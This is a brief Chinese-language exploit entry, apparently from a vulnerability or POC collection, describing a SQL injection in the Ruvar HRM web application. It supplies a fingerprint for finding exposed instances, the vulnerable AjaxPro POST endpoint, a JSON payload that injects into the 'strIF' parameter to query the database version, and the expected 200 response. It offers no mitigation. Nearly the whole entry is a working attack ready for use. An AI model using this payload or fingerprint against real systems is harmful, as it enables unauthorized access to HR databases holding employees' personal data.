# 璐华HRMRuvarHRM.Web.Common.ashx存在SQL注入漏洞

璐华HRMRuvarHRM.Web. ｜ SQL注入 ｜ —
- **指纹**：`"RuvarHRM/web_login/login.aspx"`
- **请求**：`POST /ajaxpro/RuvarHRM.Web.Common.get_account_by_tree,RuvarHRM.Web.Common.ashx HTTP/1.1`

**Payload**
```
{"strIF":"1=1) and 1=@@version--","deptPv":"0","strUserType":"all"}
```
- **响应特征**：200